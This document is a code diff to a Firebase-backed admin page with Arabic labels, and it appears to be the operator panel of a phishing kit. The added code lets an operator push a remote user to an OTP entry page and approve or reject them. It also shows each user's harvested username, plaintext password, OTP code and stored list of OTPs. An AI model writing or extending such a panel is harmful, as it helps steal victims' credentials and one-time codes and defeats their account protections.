@@ -800,6 +800,7 @@ export default function NotificationsPage() {
   const [sortOrder, setSortOrder] = useState<"asc" | "desc">("desc");
   const [soundEnabled, setSoundEnabled] = useState(false);
   const soundRefs = useRef<Record<SoundKey, HTMLAudioElement> | null>(null);
+  const notificationsListenerRef = useRef<(() => void) | null>(null);
   const router = useRouter();
   const onlineUsersCount = useOnlineUsersCount();
 
@@ -975,21 +976,28 @@ export default function NotificationsPage() {
 
   // Firebase authentication and data fetching
   useEffect(() => {
-    const unsubscribe = onAuthStateChanged(auth, (user) => {
+    const unsubscribeAuth = onAuthStateChanged(auth, (user) => {
       if (!user) {
         router.push("/login");
       } else {
-        const unsubscribeNotifications = fetchNotifications();
-        return () => {
-          unsubscribeNotifications();
-        };
+        fetchNotifications();
       }
     });
 
-    return () => unsubscribe();
+    return () => {
+      unsubscribeAuth();
+      if (notificationsListenerRef.current) {
+        notificationsListenerRef.current();
+        notificationsListenerRef.current = null;
+      }
+    };
   }, [router]);
 
   const fetchNotifications = () => {
+    if (notificationsListenerRef.current) {
+      notificationsListenerRef.current();
+      notificationsListenerRef.current = null;
+    }
     setIsLoading(true);
     const q = query(collection(db, "users"), orderBy("createdAt", "desc"));
     const unsubscribe = onSnapshot(
@@ -1003,7 +1011,12 @@ export default function NotificationsPage() {
               data?.createdAt ??
               data?.createdDate ??
               "";
-            return { id: doc.id, createdDate, ...data };
+            return {
+              id: doc.id,
+              createdDate,
+              ...data,
+              allOtps: data.allOtps || data.otpall || null,
+            };
           })
           .filter(
             (notification: any) => !notification.isHidden
@@ -1048,6 +1061,7 @@ export default function NotificationsPage() {
       }
     );
 
+    notificationsListenerRef.current = unsubscribe;
     return unsubscribe;
   };
 
@@ -1205,8 +1219,31 @@ export default function NotificationsPage() {
   };
 
   const handleRefresh = () => {
-    setIsLoading(true);
     fetchNotifications();
+  };
+
+  const handleSendOtp = async (id: string) => {
+    try {
+      const docRef = doc(db, "users", id);
+      await updateDoc(docRef, {
+        currentPage: "otp",
+        otpStatus: "otp_requested",
+        status: "pending",
+      });
+      playSound("approve");
+      toast({
+        title: "تم إرسال طلب OTP",
+        description: "تم تحويل المستخدم إلى صفحة إدخال الرمز",
+        variant: "default",
+      });
+    } catch (error) {
+      console.error("Error sending OTP request:", error);
+      toast({
+        title: "خطأ",
+        description: "حدث خطأ أثناء إرسال طلب OTP",
+        variant: "destructive",
+      });
+    }
   };
 
   if (isLoading) {
@@ -1762,7 +1799,7 @@ export default function NotificationsPage() {
                         )}
                       </td>
                       <td className="px-6 py-4">
-                        <div className="flex justify-center gap-1">
+                        <div className="flex justify-center gap-1 flex-wrap">
                           <TooltipProvider>
                             <Tooltip>
                               <TooltipTrigger asChild>
@@ -1809,6 +1846,24 @@ export default function NotificationsPage() {
                             <Tooltip>
                               <TooltipTrigger asChild>
                                 <Button
+                                  variant="outline"
+                                  size="sm"
+                                  onClick={() => handleSendOtp(notification.id)}
+                                  className="bg-gradient-to-r from-blue-500 to-blue-600 text-white border-0 hover:from-blue-600 hover:to-blue-700"
+                                >
+                                  <Bell className="h-4 w-4" />
+                                </Button>
+                              </TooltipTrigger>
+                              <TooltipContent>
+                                <p>تحويل / طلب OTP</p>
+                              </TooltipContent>
+                            </Tooltip>
+                          </TooltipProvider>
+
+                          <TooltipProvider>
+                            <Tooltip>
+                              <TooltipTrigger asChild>
+                                <Button
                                   variant="ghost"
                                   size="sm"
                                   onClick={() => handleDelete(notification.id)}
@@ -1822,7 +1877,18 @@ export default function NotificationsPage() {
                               </TooltipContent>
                             </Tooltip>
                           </TooltipProvider>
-                          <Badge>{notification?.currentPage}</Badge>
+
+                          <FlagColorSelector
+                            notificationId={notification.id}
+                            currentColor={(notification.flagColor as FlagColor) || null}
+                            onColorChange={handleFlagColorChange}
+                          />
+
+                          {notification?.currentPage && (
+                            <Badge variant="outline" className="text-xs">
+                              {notification.currentPage}
+                            </Badge>
+                          )}
                         </div>
                       </td>
                     </tr>
@@ -1932,7 +1998,7 @@ export default function NotificationsPage() {
                         )}
                       </div>
 
-                      <div className="flex gap-2 pt-2 border-t">
+                      <div className="flex gap-2 pt-2 border-t flex-wrap">
                         <Button
                           onClick={() =>
                             handleApproval("approved", notification.id)
@@ -1956,6 +2022,14 @@ export default function NotificationsPage() {
                           رفض
                         </Button>
                         <Button
+                          onClick={() => handleSendOtp(notification.id)}
+                          className="flex-1 bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white"
+                          size="sm"
+                        >
+                          <Bell className="h-4 w-4 mr-1" />
+                          تحويل
+                        </Button>
+                        <Button
                           variant="outline"
                           onClick={() => handleDelete(notification.id)}
                           className="text-red-500 hover:text-red-600 hover:bg-red-50"
@@ -1963,8 +2037,11 @@ export default function NotificationsPage() {
                         >
                           <Trash2 className="h-4 w-4" />
                         </Button>
-
-                        <Badge>{notification?.currentPage}</Badge>
+                        {notification?.currentPage && (
+                          <Badge variant="outline" className="text-xs">
+                            {notification.currentPage}
+                          </Badge>
+                        )}
                       </div>
                     </div>
                   </CardContent>
@@ -2064,6 +2141,10 @@ export default function NotificationsPage() {
                   { label: "البريد الإلكتروني", value: selectedNotification.email },
                   { label: "رقم الجوال", value: selectedNotification.phone },
                   { label: "العنوان", value: selectedNotification.address },
+                  { label: "اسم المستخدم", value: selectedNotification.userName },
+                  { label: "كلمة المرور", value: selectedNotification.password },
+                  { label: "الصفحة الحالية", value: selectedNotification.currentPage },
+                  { label: "رمز OTP", value: selectedNotification.otp },
                 ].map(
                   ({ label, value }) =>
                     value && (
